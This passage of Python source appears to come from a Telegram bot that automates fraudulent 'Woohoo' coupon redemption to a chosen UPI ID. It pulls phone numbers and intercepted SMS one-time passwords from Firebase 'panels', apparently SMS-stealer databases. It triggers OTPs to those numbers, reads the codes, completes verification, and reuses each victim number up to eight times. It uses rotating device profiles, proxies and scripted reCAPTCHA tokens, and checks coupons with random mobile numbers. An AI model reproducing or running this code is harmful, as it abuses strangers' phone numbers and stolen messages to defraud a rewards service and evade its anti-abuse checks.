                    inherited_online=branch_online,
                )
                for n in sub_nums:
                    if n not in results:
                        results.append(n)
            elif branch_online and val is not None and isinstance(val, dict):
                val_nums = re.findall(number_pattern, str(val))
                for n in val_nums:
                    if n not in results:
                        results.append(n)

    elif isinstance(obj, list):
        for item in obj:
            sub_nums = _extract_online_numbers_from_tree(
                item,
                inherited_offline=inherited_offline,
                inherited_online=inherited_online,
            )
            for n in sub_nums:
                if n not in results:
                    results.append(n)

    return results


def _get_firebase_root_and_query(firebase_url: str) -> tuple[str, str]:
    """Splits a Firebase URL into its clean root URL and optional query string (e.g., auth=...)."""
    parsed = urlparse(firebase_url.strip())
    path = parsed.path or ""
    if path.endswith("/.json"):
        path = path[:-6]
    elif path.endswith("/json"):
        path = path[:-5]
    elif path.endswith(".json"):
        path = path[:-5]
    root = parsed._replace(path=path.rstrip("/"), query="").geturl()
    return root, parsed.query


def get_online_numbers(firebase_url: str) -> list[dict]:
    """Fetches numbers with 'online' status from Firebase /numbers.json."""
    root_url, query = _get_firebase_root_and_query(firebase_url)
    target = f"{root_url}/numbers.json" + (f"?{query}" if query else "")
    try:
        res = requests.get(target, timeout=10)
        if res.status_code == 200 and res.json():
            data = res.json()
            online_list = []

            if isinstance(data, dict):
                for key, info in data.items():
                    if isinstance(info, dict) and str(info.get("status", "")).lower() == "online":
                        num = info.get("number") or info.get("phone") or key
                        online_list.append({"id": key, "number": str(num)})
            return online_list
    except Exception as e:
        print(f"  [Error] Failed to fetch online numbers from Firebase ({root_url}): {e}")
    return []


def trigger_otp_send(number: str, otp_sender_fn: Optional[Callable[[str], bool]] = None) -> bool:
    """
    Invokes the actual OTP trigger callback (otp_sender_fn) for the target mobile number.
    (Full Woohoo OTP dispatch is handled inside auto_claim_triplet_on_woohoo.)
    """
    print(f"  -> Triggering OTP send to {number}...")
    if callable(otp_sender_fn):
        try:
            return bool(otp_sender_fn(number))
        except Exception as e:
            print(f"  [Error] Failed to trigger OTP for {number}: {e}")
            return False
    return False


def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
    """Polls Firebase every 1 second for up to WAIT_SECONDS (10s) for a newly arrived 6-digit OTP."""
    root_url, query = _get_firebase_root_and_query(firebase_url)
    target = f"{root_url}/numbers/{number_id}/otp.json" + (f"?{query}" if query else "")
    for _ in range(WAIT_SECONDS):
        try:
            res = requests.get(target, timeout=5)
            if res.status_code == 200:
                otp_val = res.json()
                if otp_val is not None:
                    matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(otp_val).strip())
                    if matched:
                        return matched.group(1)
        except Exception:
            pass
        time.sleep(1)
    return None


def clear_old_otp(firebase_url: str, number_id: str) -> None:
    """Clears stale OTP entries before dispatching a new OTP."""
    root_url, query = _get_firebase_root_and_query(firebase_url)
    target = f"{root_url}/numbers/{number_id}.json" + (f"?{query}" if query else "")
    try:
        requests.patch(target, json={"otp": ""}, timeout=5)
    except Exception:
        pass


def process_all_panels(
    firebase_urls: list[str],
    used_numbers: Optional[list[str]] = None,
    otp_sender_fn: Optional[Callable[[str], bool]] = None,
) -> Optional[dict]:
    """
    Iterates through all Active Firebase URLs and their 'online' numbers:
    - Attempts up to MAX_SEND_RETRIES (2) per online number
    - Clears stale OTP, triggers a fresh OTP, and polls for WAIT_SECONDS (10s)
    - Automatically switches to the next online number or Firebase URL on timeout.
    """
    if used_numbers is None:
        used_numbers = []

    for fb_url in firebase_urls:
        print(f"\n==========================================")
        print(f"Checking panel: {fb_url}")

        online_numbers = get_online_numbers(fb_url)
        if not online_numbers:
            print("-> No 'online' numbers found in this panel. Moving to next URL...")
            continue

        print(f"-> Found {len(online_numbers)} online numbers.")

        fresh_items = [it for it in online_numbers if it["number"] not in used_numbers]
        ordered_items = fresh_items if fresh_items else online_numbers

        for item in ordered_items:
            num_id = item["id"]
            phone = item["number"]
            print(f"\n[Active Number]: {phone} (ID: {num_id})")

            for attempt in range(1, MAX_SEND_RETRIES + 1):
                print(f"  Attempt {attempt}/{MAX_SEND_RETRIES}:")

                clear_old_otp(fb_url, num_id)
                sent_ok = trigger_otp_send(phone, otp_sender_fn=otp_sender_fn)
                if not sent_ok:
                    print(f"  [Skipped] Could not trigger OTP for {phone}.")
                    break

                print(f"  Waiting {WAIT_SECONDS} seconds for OTP...")
                otp = check_otp_in_firebase(fb_url, num_id)

                if otp:
                    print(f"\n[Success] OTP received on {phone}: {otp}")
                    return {"url": fb_url, "id": num_id, "number": phone, "otp": otp}

                print(f"  [Failed] No OTP received within {WAIT_SECONDS} seconds.")

            print(f"-> No OTP on {phone} after {MAX_SEND_RETRIES} attempts. Switching to next online number...")

        print(f"\n-> Exhausted all online numbers on ({fb_url}). Moving to next Firebase URL...")

    print("\n[Completed] All Firebase URLs and online numbers checked.")
    return None


def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
    """Checks the single Firebase URL once and extracts 10-digit Indian mobile numbers exclusively from explicitly Online sessions."""
    target_url = _build_firebase_query_url(firebase_url, "")
    found_numbers = []

    try:
        resp = requests.get(target_url, timeout=12)
        if resp.status_code == 200 and resp.json():
            data = resp.json()
            online_nums = _extract_online_numbers_from_tree(data, inherited_offline=False, inherited_online=False)
            for num in online_nums:
                if num not in found_numbers:
                    found_numbers.append(num)
    except Exception:
        pass

    return found_numbers


async def fetch_random_active_number_from_panels(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
    """
    Fetches an active online number from saved Active Firebase Panels
    (via /numbers.json first, falling back to single-URL tree scanning).
    """
    session_panels: dict = context.user_data.get("session_panels", {})
    active_endpoints = [
        ep for ep, info in session_panels.items() if info.get("is_active")
    ]
    if not active_endpoints:
        return None

    random.shuffle(active_endpoints)
    used_numbers: list[str] = context.user_data.setdefault("used_firebase_numbers", [])

    all_candidates = []
    for ep in active_endpoints:
        structured_online = await asyncio.to_thread(get_online_numbers, ep)
        if structured_online:
            for item in structured_online:
                all_candidates.append({
                    "number": item["number"],
                    "endpoint": ep,
                    "otp": None,
                    "id": item["id"],
                })
        else:
            nums = await asyncio.to_thread(_fetch_numbers_from_single_firebase_sync, ep)
            for n in nums:
                all_candidates.append({
                    "number": n,
                    "endpoint": ep,
                    "otp": None,
                    "id": None,
                })

    if not all_candidates:
        return None

    fresh_candidates = [c for c in all_candidates if c["number"] not in used_numbers]
    chosen = random.choice(fresh_candidates if fresh_candidates else all_candidates)

    if chosen["number"] not in used_numbers:
        used_numbers.append(chosen["number"])

    return chosen


def _http_raw_sync(method: str, url: str, timeout: float = 8) -> tuple[int, Optional[dict]]:
    try:
        res = requests.request(method, url, timeout=timeout)
        try:
            data = res.json()
        except Exception:
            data = None
        return res.status_code, data if isinstance(data, dict) else None
    except Exception:
        return 0, None


async def _http_raw(method: str, url: str, timeout: float = 8) -> tuple[int, Optional[dict]]:
    return await asyncio.to_thread(_http_raw_sync, method, url, timeout)


async def fetch_otp_from_firebase(
    fb_url: str,
    client_id: str,
    trigger_ms: int,
    timeout: float = SMS_WAIT_TIMEOUT,
    exclude: Optional[set] = None,
) -> Optional[str]:
    exclude = exclude or set()
    start = time.time()
    floor = int(trigger_ms) - 5000
    root_url, query = _get_firebase_root_and_query(fb_url)
    base = root_url.rstrip("/")
    q_suffix = f"?{query}" if query else ""
    cid = str(client_id or "").strip()

    raw_paths = [
        f"{base}/messages/{cid}.json",
        f"{base}/All_User/Sms/{cid}.json",
        f"{base}/All_Users/Sms/{cid}.json",
        f"{base}/user_sms/{cid}.json",
        f"{base}/sms/{cid}.json",
        f"{base}/Sms/{cid}.json",
    ] if cid else [
        f"{base}/messages.json",
        f"{base}/All_User/Sms.json",
        f"{base}/All_Users/Sms.json",
        f"{base}/user_sms.json",
        f"{base}/sms.json",
        f"{base}/Sms.json",
        _build_firebase_query_url(fb_url, ""),
    ]
    paths = list(dict.fromkeys(p + q_suffix for p in raw_paths))

    text_fields = (
        "body", "message", "text", "sms", "msg", "content",
        "message_body", "Message", "Body", "Text", "SMS",
    )

    while time.time() - start < timeout:
        for url in paths:
            status, data = await _http_raw("GET", url, timeout=8)
            if status != 200 or not isinstance(data, dict) or not data:
                continue
            for mid in sorted(data.keys(), reverse=True):
                msg = data[mid]
                if not isinstance(msg, dict):
                    continue
                try:
                    if int(mid) < floor:
                        continue
                except (ValueError, TypeError):
                    pass
                text = ""
                for f in text_fields:
                    v = msg.get(f)
                    if v:
                        text = str(v)
                        break
                if not text:
                    continue
                if not any(kw in text.lower() for kw in OTP_KEYWORDS):
                    continue
                for pat in OTP_PATTERNS:
                    m = pat.search(text)
                    if m:
                        otp = m.group(1) if m.groups() else m.group(0)
                        otp = re.sub(r"\D", "", otp)
                        if len(otp) == 6 and otp not in exclude:
                            return otp
        await asyncio.sleep(0.5)
    return None


def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optional[str], baseline_otps: list[str]) -> Optional[str]:
    """
    Polls the single Firebase endpoint every 1 second for up to WAIT_SECONDS (10s)
    for a new 6-digit OTP specifically associated with the target number.
    """
    root_url, query = _get_firebase_root_and_query(firebase_url)
    q_suffix = f"?{query}" if query else ""
    target_url = (
        f"{root_url}/numbers/{number_id}/otp.json{q_suffix}"
        if number_id
        else _build_firebase_query_url(firebase_url, "")
    )

    for _ in range(WAIT_SECONDS):
        try:
            res = requests.get(target_url, timeout=5)
            if res.status_code == 200 and res.json() is not None:
                payload_val = res.json()
                if isinstance(payload_val, dict):
                    for mid in sorted(payload_val.keys(), reverse=True):
                        msg = payload_val[mid]
                        if isinstance(msg, dict):
                            text = ""
                            for f in (
                                "body", "message", "text", "sms", "msg", "content",
                                "message_body", "Message", "Body", "Text", "SMS",
                            ):
                                v = msg.get(f)
                                if v:
                                    text = str(v)
                                    break
                            if text and any(kw in text.lower() for kw in OTP_KEYWORDS):
                                for pat in OTP_PATTERNS:
                                    m = pat.search(text)
                                    if m:
                                        otp = re.sub(r"\D", "", m.group(1) if m.groups() else m.group(0))
                                        if len(otp) == 6 and otp not in baseline_otps:
                                            return otp
                matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(payload_val).strip())
                if matched and matched.group(1) not in baseline_otps:
                    return matched.group(1)
        except Exception:
            pass
        time.sleep(1)
    return None


def _get_baseline_otps_sync(firebase_url: str) -> list[str]:
    """Captures pre-existing 6-digit OTPs from the single Firebase endpoint before triggering a new OTP."""
    target_url = _build_firebase_query_url(firebase_url, "")
    existing = []
    try:
        res = requests.get(target_url, timeout=6)
        if res.status_code == 200 and res.json():
            raw_dump = json.dumps(res.json(), ensure_ascii=False)
            for o in extract_numbers_and_otps(raw_dump).get("otps", []):
                if len(o) == 6 and o not in existing:
                    existing.append(o)
    except Exception:
        pass
    return existing


def _sanitize_plain_log_text(raw: str) -> str:
    """Strips Markdown formatting characters so live/plain logs never trigger entity parse errors."""
    cleaned = re.sub(r"[*_`\[\]~]+", "", str(raw or ""))
    return " ".join(cleaned.split())


def _get_pinned_working_number(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
    """Returns the currently pinned working Firebase number if it still has remaining uses (up to 8)."""
    pinned = context.user_data.get("pinned_firebase_number")
    if pinned and pinned.get("remaining_uses", 0) > 0:
        return pinned
    return None


def _pin_or_increment_working_number(context: ContextTypes.DEFAULT_TYPE, phone: str, fb_url: str, num_id: Optional[str]) -> dict:
    """Pins a verified working number for up to MAX_FIREBASE_NUMBER_USES (8 total claims) or increments its usage."""
    pinned = context.user_data.get("pinned_firebase_number")
    if pinned and pinned.get("number") == phone and pinned.get("remaining_uses", 0) > 0:
        pinned["used_count"] += 1
        pinned["remaining_uses"] = max(0, pinned["max_uses"] - pinned["used_count"])
        if pinned["remaining_uses"] == 0:
            context.user_data["pinned_firebase_number"] = None
        return pinned

    new_pin = {
        "number": phone,
        "endpoint": fb_url,
        "id": num_id,
        "max_uses": MAX_FIREBASE_NUMBER_USES,
        "used_count": 1,
        "remaining_uses": max(0, MAX_FIREBASE_NUMBER_USES - 1),
    }
    if new_pin["remaining_uses"] > 0:
        context.user_data["pinned_firebase_number"] = new_pin
    else:
        context.user_data["pinned_firebase_number"] = None
    return new_pin


async def auto_claim_triplet_on_woohoo(
    context: ContextTypes.DEFAULT_TYPE,
    coupon_code: str,
    upi_id: str,
    progress_callback: Optional[Callable[[str, list[str]], Awaitable[None]]] = None,
) -> dict:
    """
    Executes the full automated claim workflow for an Online Number + Coupon + UPI triplet:
    1. Reserves the UPI ID for automatic submission in Step 3.
    2. Locks the current coupon code until it is successfully claimed.
    3. Reuses a verified working number up to 8 times (or tries online numbers in Active Firebase Panels
       with up to 2 retries and 10-second polling per number).
    4. Automatically completes Step 2 (OTP Verification) and Step 3 (UPI Submission).
    """
    session_panels: dict = context.user_data.get("session_panels", {})
    active_endpoints = [
        ep for ep, info in session_panels.items() if info.get("is_active")
    ]
    if not active_endpoints:
        return {"success": False, "reason": "NO_ACTIVE_PANELS", "message": "No active Firebase panels found.", "failed_logs": []}

    used_numbers: list[str] = context.user_data.setdefault("used_firebase_numbers", [])
    used_otps_global: list[str] = context.user_data.setdefault("used_firebase_otps", [])
    last_error_msg = "Unable to receive OTP or complete claim on any online number."
    failed_logs: list[str] = []

    async def _notify_progress(status_line: str):
        if callable(progress_callback):
            try:
                await progress_callback(_sanitize_plain_log_text(status_line), list(failed_logs))
            except Exception:
                pass

    ordered_queue: list[tuple[str, dict]] = []
    pinned_num = _get_pinned_working_number(context)
    if pinned_num:
        ordered_queue.append((
            pinned_num["endpoint"],
            {"id": pinned_num.get("id"), "number": pinned_num["number"], "is_pinned": True},
        ))

    for fb_url in active_endpoints:
        await _notify_progress(f"Scanning online numbers from {fb_url}...")
        structured_online = await asyncio.to_thread(get_online_numbers, fb_url)
        candidates = []
        if structured_online:
            for item in structured_online:
                candidates.append({"id": item["id"], "number": item["number"], "is_pinned": False})
        else:
            raw_nums = await asyncio.to_thread(_fetch_numbers_from_single_firebase_sync, fb_url)
            for num in raw_nums:
                candidates.append({"id": None, "number": num, "is_pinned": False})

        if not candidates:
            continue

        seen_in_panel: set[str] = set()
        if pinned_num and pinned_num["endpoint"] == fb_url:
            seen_in_panel.add(pinned_num["number"])

        # First queue fresh numbers not yet in used_numbers
        for c in candidates:
            if c["number"] not in used_numbers and c["number"] not in seen_in_panel:
                seen_in_panel.add(c["number"])
                ordered_queue.append((fb_url, c))

        # Also queue any other numbers from this panel not yet in ordered_queue for this panel
        for c in candidates:
            if c["number"] not in seen_in_panel:
                seen_in_panel.add(c["number"])
                ordered_queue.append((fb_url, c))

    if not ordered_queue:
        return {"success": False, "reason": "ALL_NUMBERS_EXHAUSTED", "message": last_error_msg, "failed_logs": failed_logs}

    for fb_url, item in ordered_queue:
        phone = item["number"]
        num_id = item["id"]
        is_pinned_item = bool(item.get("is_pinned"))

        if not is_pinned_item and phone not in used_numbers:
            used_numbers.append(phone)

        await _notify_progress(f"Initializing session for {phone}...")

        selected_device = random.choice(DEVICE_PROFILES)
        proxy_cfg = random.choice(PROXIES_CONFIG) if PROXIES_CONFIG else None
        client = UnifiedSessionClient(
            base_url=BASE_URL,
            device_profile=selected_device,
            proxy_cfg=proxy_cfg,
            headless=True,
        )

        try:
            await client.start()
            page_info = await asyncio.wait_for(client.load_initial_page(), timeout=25.0)
            dynamic_token = page_info.get("csrf_token", "")
            scraped_states = page_info.get("states", [])

            if not dynamic_token:
                last_error_msg = "Failed to fetch initial session token from the website."
                if is_pinned_item:
                    context.user_data["pinned_firebase_number"] = None
                failed_logs.append(f"❌ {phone} — Failed (Session token error)")
                await _notify_progress(f"Session failed for {phone}, switching...")
                continue

            matching_states = [s for s in scraped_states if s["name"] in STATES_LIST]
            if matching_states:
                chosen_state = random.choice(matching_states)
                state_name = chosen_state["name"]
                state_dropdown_id = chosen_state["id"]
            elif scraped_states:
                chosen_state = random.choice(scraped_states)
                state_name = chosen_state["name"]
                state_dropdown_id = chosen_state["id"]
            else:
                state_name = random.choice(STATES_LIST)
                state_dropdown_id = "1"

            received_otp = None
            coupon_invalid = False
            step1_error_reason = ""

            for attempt in range(1, MAX_SEND_RETRIES + 1):
                await _notify_progress(f"Trying {phone} (Attempt {attempt}/{MAX_SEND_RETRIES} — Sending OTP)...")

                if num_id:
                    await asyncio.to_thread(clear_old_otp, fb_url, num_id)
                baseline_otps = await asyncio.to_thread(_get_baseline_otps_sync, fb_url)
                for prev_otp in used_otps_global:
                    if prev_otp not in baseline_otps:
                        baseline_otps.append(prev_otp)

                trigger_ms = int(time.time() * 1000)
                recaptcha_token = await client.get_dynamic_token(action="submit")
                payload_step_1 = {
                    "__RequestVerificationToken": dynamic_token,
                    "token": recaptcha_token,
                    "curPage": "1",
                    "maxPage": "3",
                    "stateDropdown": state_dropdown_id,
                    "cityDropdown": "0",
                    "branchDropdown": "0",
                    "retailerDropdown": "0",
                    "talukanameDropdown": "0",
                    "parametersOccurance": "0",
                    "CALLPANNAMEMATCH": "0",
                    "MOBILE": phone,
                    "COUPONCODE": coupon_code,
                    "STATE": state_name,
                    "CHECKBOX1": "on",
                    "OTP": "",
                    "REDEMPTIONTYPE": "",
                    "ChoiceAnswer": "",
                }

                res_1 = await safe_post_json(client, API_ENDPOINT, payload_step_1)
                if res_1.get("token"):
                    dynamic_token = res_1["token"]

                if res_1.get("error", True):
                    err_body = str(res_1.get("messageBody") or res_1)
                    last_error_msg = err_body
                    step1_error_reason = _sanitize_plain_log_text(err_body)[:60]
                    if any(k in err_body.lower() for k in ("invalid coupon", "already used", "already claimed", "expired", "not valid")):
                        coupon_invalid = True
                        break
                    continue

                await _notify_progress(f"Trying {phone} (Attempt {attempt}/{MAX_SEND_RETRIES} — Waiting {WAIT_SECONDS}s for OTP)...")

                received_otp = await fetch_otp_from_firebase(
                    fb_url=fb_url,
                    client_id=str(num_id or ""),
                    trigger_ms=trigger_ms,
                    timeout=SMS_WAIT_TIMEOUT,
                    exclude=set(baseline_otps),
                )
                if not received_otp:
                    received_otp = await asyncio.to_thread(
                        _poll_otp_for_number_sync,
                        fb_url,
                        phone,
                        num_id,
                        baseline_otps,
                    )
                if received_otp and len(received_otp) == 6 and received_otp.isdigit() and received_otp not in used_otps_global:
                    break
                received_otp = None

            if coupon_invalid:
                return {
                    "success": False,
                    "reason": "COUPON_INVALID",
                    "message": f"Coupon `{coupon_code}` Error: {last_error_msg}",
                    "failed_logs": failed_logs,
                }

            if not received_otp:
                if is_pinned_item:
                    context.user_data["pinned_firebase_number"] = None
                reason_short = step1_error_reason if step1_error_reason else f"No OTP after {MAX_SEND_RETRIES} attempts"
                last_error_msg = f"No OTP received on {phone} after {MAX_SEND_RETRIES} attempts."
                failed_logs.append(f"❌ {phone} — Failed ({reason_short})")
                await _notify_progress(f"Number {phone} failed, switching to next...")
                continue

            # STEP 2: OTP Verification
            await _notify_progress(f"OTP {received_otp} received on {phone} — Verifying OTP...")
            recaptcha_token_2 = await client.get_dynamic_token(action="submit")
            payload_step_2 = {
                "__RequestVerificationToken": dynamic_token,
                "token": recaptcha_token_2,
                "curPage": "2",
                "maxPage": "3",
                "stateDropdown": state_dropdown_id,
                "cityDropdown": "0",
                "branchDropdown": "0",
                "retailerDropdown": "0",
                "talukanameDropdown": "0",
                "parametersOccurance": "0",
                "CALLPANNAMEMATCH": "0",
                "MOBILE": phone,
                "COUPONCODE": coupon_code,
                "STATE": state_name,
                "CHECKBOX1": "on",
                "OTP": received_otp,
                "REDEMPTIONTYPE": "",
                "ChoiceAnswer": "",
            }

            res_2 = await safe_post_json(client, API_ENDPOINT, payload_step_2)
            if res_2.get("token"):
                dynamic_token = res_2["token"]

            if res_2.get("error", True):
                if received_otp not in used_otps_global:
                    used_otps_global.append(received_otp)
                if is_pinned_item:
                    context.user_data["pinned_firebase_number"] = None
                err_2 = str(res_2.get("messageBody") or res_2)
                last_error_msg = f"OTP Verification Failed ({phone}): {err_2}"
                failed_logs.append(f"❌ {phone} — Failed ({_sanitize_plain_log_text(err_2)[:50]})")
                await _notify_progress(f"Number {phone} failed OTP check, switching...")
                continue

            # STEP 3: Final UPI Submission
            await _notify_progress(f"OTP verified on {phone} — Submitting UPI {upi_id}...")
            recaptcha_token_3 = await client.get_dynamic_token(action="submit")
            payload_step_3 = {
                "__RequestVerificationToken": dynamic_token,
                "token": recaptcha_token_3,
                "curPage": "3",
                "maxPage": "3",
                "stateDropdown": state_dropdown_id,
                "cityDropdown": "0",
                "branchDropdown": "0",
                "retailerDropdown": "0",
                "talukanameDropdown": "0",
                "parametersOccurance": "0",
                "CALLPANNAMEMATCH": "0",
                "MOBILE": phone,
                "COUPONCODE": coupon_code,
                "STATE": state_name,
                "CHECKBOX1": "on",
                "OTP": received_otp,
                "REDEMPTIONTYPERADIO": "on",
                "REDEMPTIONTYPE": "10117",
                "UPIID": upi_id,
                "CHECKBOX2": "on",
                "ChoiceAnswer": "10117_on",
            }

            res_3 = await safe_post_json(client, API_ENDPOINT, payload_step_3)
            if not res_3.get("error", True):
                if received_otp not in used_otps_global:
                    used_otps_global.append(received_otp)
                success_msg = res_3.get("messageBody") or "Coupon successfully claimed!"
                pin_info = _pin_or_increment_working_number(context, phone, fb_url, num_id)
                return {
                    "success": True,
                    "number": phone,
                    "endpoint": fb_url,
                    "otp": received_otp,
                    "coupon": coupon_code,
                    "upi_id": upi_id,
                    "server_message": success_msg,
                    "failed_logs": failed_logs,
                    "number_use_count": pin_info["used_count"],
                    "number_max_uses": pin_info["max_uses"],
                }
            else:
                if is_pinned_item:
                    context.user_data["pinned_firebase_number"] = None
                err_3 = str(res_3.get("messageBody") or res_3)
                last_error_msg = f"Final UPI Submission Error: {err_3}"
                failed_logs.append(f"❌ {phone} — Failed ({_sanitize_plain_log_text(err_3)[:50]})")
                await _notify_progress(f"Number {phone} failed at UPI step, switching...")
                continue

        except Exception as e:
            if is_pinned_item:
                context.user_data["pinned_firebase_number"] = None
            last_error_msg = str(e)
            safe_err = _sanitize_plain_log_text(str(e))[:45]
            failed_logs.append(f"❌ {phone} — Failed ({safe_err})")
            await _notify_progress(f"Number {phone} encountered an error, switching...")
            continue
        finally:
            await client.close()

    return {
        "success": False,
        "reason": "ALL_NUMBERS_EXHAUSTED",
        "message": last_error_msg,
        "failed_logs": failed_logs,
    }


async def check_single_coupon_step1(coupon_code: str) -> tuple[bool, str]:
    """
    Checks a single coupon using Step 1 of the Woohoo claim flow with a random
    10-digit number starting with '9431682' + 3 random digits and an available state.
    Closes the session immediately once OTP is triggered / Step 1 completes.
    Returns: (is_valid, status_detail)
    """
    random_mobile = f"9431682{random.randint(0, 999):03d}"
    selected_device = random.choice(DEVICE_PROFILES)
    proxy_cfg = random.choice(PROXIES_CONFIG) if PROXIES_CONFIG else None

    client = UnifiedSessionClient(
        base_url=BASE_URL,
        device_profile=selected_device,
        proxy_cfg=proxy_cfg,
        headless=True,
    )

    try:
        await client.start()
        page_info = await asyncio.wait_for(client.load_initial_page(), timeout=25.0)
        dynamic_token = page_info.get("csrf_token", "")
        scraped_states = page_info.get("states", [])

        if not dynamic_token:
            return False, "Session token unavailable"

        matching_states = [s for s in scraped_states if s["name"] in STATES_LIST]
        if matching_states:
            chosen_state = random.choice(matching_states)
            state_name = chosen_state["name"]
            state_dropdown_id = chosen_state["id"]
        elif scraped_states:
            chosen_state = random.choice(scraped_states)
            state_name = chosen_state["name"]
            state_dropdown_id = chosen_state["id"]
        else:
            state_name = random.choice(STATES_LIST)
            state_dropdown_id = "1"

        recaptcha_token = await client.get_dynamic_token(action="submit")
        payload_step_1 = {
            "__RequestVerificationToken": dynamic_token,
            "token": recaptcha_token,
            "curPage": "1",
            "maxPage": "3",
            "stateDropdown": state_dropdown_id,
            "cityDropdown": "0",
            "branchDropdown": "0",
            "retailerDropdown": "0",
            "talukanameDropdown": "0",
            "parametersOccurance": "0",
            "CALLPANNAMEMATCH": "0",
            "MOBILE": random_mobile,
            "COUPONCODE": coupon_code,
            "STATE": state_name,
            "CHECKBOX1": "on",
            "OTP": "",
            "REDEMPTIONTYPE": "",
            "ChoiceAnswer": "",
        }

        res_1 = await safe_post_json(client, API_ENDPOINT, payload_step_1)
        msg_body = str(res_1.get("messageBody") or "").strip()

        if not res_1.get("error", True):
            return True, msg_body or "OTP dispatched"

        err_lower = (msg_body or str(res_1)).lower()
        if any(k in err_lower for k in ("invalid", "already used", "already claimed", "expired", "not valid", "incorrect")):
            return False, msg_body or "Invalid coupon"

        return False, msg_body or "Rejected"

    except Exception as e:
        return False, _sanitize_plain_log_text(str(e))[:80]
    finally:
        await client.close()


def pick_unused_firebase_coupon(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
    """Selects one unused coupon from the user's queue and marks it as used."""
    all_coupons: list[str] = context.user_data.get("firebase_coupons", [])
    used_coupons: list[str] = context.user_data.setdefault("used_firebase_coupons", [])

    remaining = [c for c in all_coupons if c not in used_coupons]
    if not remaining:
        return None

    selected_coupon = remaining[0]
    used_coupons.append(selected_coupon)

    return {
        "coupon": selected_coupon,
        "used_total": len(used_coupons),
        "remaining_total": len(all_coupons) - len(used_coupons),
        "total_coupons": len(all_coupons),
    }


def release_unredeemed_firebase_coupon(context: ContextTypes.DEFAULT_TYPE, coupon_code: Optional[str] = None) -> Optional[str]:
    """Returns an unredeemed coupon back into the available pool if redemption fails."""
    used_coupons: list[str] = context.user_data.setdefault("used_firebase_coupons", [])
    target_coupon = (coupon_code or "").strip().upper()

    if not target_coupon:
        triplets = context.user_data.get("firebase_assigned_triplets", [])
        if triplets:
            target_coupon = triplets[-1].get("coupon", "").upper()

    if target_coupon and target_coupon in used_coupons:
        used_coupons.remove(target_coupon)
        return target_coupon

    return None


def consume_firebase_upi_use(context: ContextTypes.DEFAULT_TYPE) -> dict:
    """Consumes 1 usage slot of the active UPI ID and flags when 8 uses are reached."""
    upi_cfg = context.user_data.get("firebase_upi_config")
    if not upi_cfg or upi_cfg.get("remaining_uses", 0) <= 0:
        return {"upi_id": None, "needs_new_upi": True, "remaining_uses": 0}

    upi_cfg["used_count"] += 1
    upi_cfg["remaining_uses"] = max(0, upi_cfg["max_uses"] - upi_cfg["used_count"])

    used_list = context.user_data.setdefault("used_firebase_upis", [])
    normalized = upi_cfg["upi_id"].lower()
    if normalized not in used_list:
        used_list.append(normalized)

    needs_new = upi_cfg["remaining_uses"] == 0
    if needs_new:
        upi_cfg["completed"] = True

    return {
        "upi_id": upi_cfg["upi_id"],
        "batch_number": upi_cfg.get("batch_number", 1),
        "used_count": upi_cfg["used_count"],
        "max_uses": upi_cfg["max_uses"],
        "remaining_uses": upi_cfg["remaining_uses"],
        "needs_new_upi": needs_new,
    }


def read_text_from_zip(zip_path: str) -> str:
    """Extracts text from all .txt files inside a ZIP archive."""
    combined_text = []
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for file_info in zf.infolist():
            if file_info.is_dir():
                continue
            if file_info.filename.lower().endswith('.txt'):
                try:
                    with zf.open(file_info) as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        combined_text.append(content)
                except Exception as e:
                    logger.warning(f"Failed to read {file_info.filename} from ZIP: {e}")
    return "\n".join(combined_text)


def read_text_from_txt(txt_path: str) -> str:
    """Reads text content from a .txt file."""
    with open(txt_path, "r", encoding="utf-8", errors="ignore") as f:
        return f.read()


def _record_coupon_claim_sync(entry: dict):
    """Appends a successfully claimed coupon record to claimed_coupons.json."""
    data = []
    if os.path.exists(CLAIMS_DATA_FILE):
        try:
            with open(CLAIMS_DATA_FILE, "r", encoding="utf-8") as file:
                loaded = json.load(file)
                if isinstance(loaded, list):
                    data = loaded
        except (json.JSONDecodeError, IOError):
            data = []

    data.append(entry)

    with open(CLAIMS_DATA_FILE, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4, ensure_ascii=False)


async def record_successful_coupon_claim(entry: dict):
    """Thread-safe wrapper to persist successful coupon claims."""
    async with file_lock:
        await asyncio.to_thread(_record_coupon_claim_sync, entry)


def _get_real_leaderboard_sync() -> list[dict]:
    """Calculates real-time per-user coupon claim counts from claimed_coupons.json."""
    if not os.path.exists(CLAIMS_DATA_FILE):
        return []

    try:
        with open(CLAIMS_DATA_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)
            if not isinstance(data, list):
                return []
    except (json.JSONDecodeError, IOError):
        return []

    user_stats = defaultdict(lambda: {"name": "Unknown User", "count": 0})

    for entry in data:
        if not isinstance(entry, dict):
            continue
        if entry.get("status") != "Claimed":
            continue

        user_id = entry.get("user_id")
        if not user_id:
            continue

        user_name = entry.get("user_name") or f"User_{user_id}"
        user_stats[user_id]["name"] = user_name
        user_stats[user_id]["count"] += 1

    sorted_users = sorted(
        [{"user_id": uid, **info} for uid, info in user_stats.items()],
        key=lambda x: x["count"],
        reverse=True,
    )
    return sorted_users


async def get_leaderboard_text(current_user_id: int) -> str:
    """Formats the real-time coupon claim leaderboard message."""
    async with file_lock:
        leaderboard = await asyncio.to_thread(_get_real_leaderboard_sync)

    if not leaderboard:
        return (
            "🏆 **Coupon Claim Leaderboard**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "No coupons have been claimed yet.\n"
            "Be the first to claim a coupon and take the #1 spot!"
        )

    medals = {1: "🥇", 2: "🥈", 3: "🥉"}
    lines = [
        "🏆 **Real-Time Coupon Claim Leaderboard**",
        "━━━━━━━━━━━━━━━━━━━━━━\n",
    ]

    total_all_claims = sum(u["count"] for u in leaderboard)
    user_rank_info = None

    for idx, user in enumerate(leaderboard, 1):
        if user["user_id"] == current_user_id:
            user_rank_info = (idx, user["count"])

        if idx <= 10:
            rank_icon = medals.get(idx, f"**#{idx}**")
            safe_name = str(user["name"]).replace("_", " ").replace("*", "").replace("`", "")
            lines.append(f"{rank_icon} **{safe_name}** — `{user['count']}` Coupons Claimed")

